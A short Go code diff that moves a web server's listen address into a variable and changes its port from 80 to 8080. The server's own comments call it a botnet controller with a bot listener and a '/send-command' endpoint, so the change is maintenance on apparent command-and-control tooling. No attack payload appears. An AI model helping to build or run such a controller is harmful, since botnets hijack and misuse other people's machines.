@@ -32,6 +32,7 @@ type User struct {
 func main() {
 	// Initialize database connection
 	initDB()
+	serverAddress := "birdo.local:8080"
 
 	// Start the botnet controller listener
 	go startBotListener()
@@ -46,8 +47,8 @@ func main() {
 	http.HandleFunc("/send-command", sendCommandHandler)
 	http.Handle("/static/", http.StripPrefix("/static/", http.FileServer(http.Dir("static"))))
 
-	log.Println("Server started on http://birdo.local:80")
-	err := http.ListenAndServe("birdo.local:80", nil)
+	log.Println("Server started on http://" + serverAddress)
+	err := http.ListenAndServe(serverAddress, nil)
 	if err != nil {
 		log.Fatal("Server error:", err)
 	}
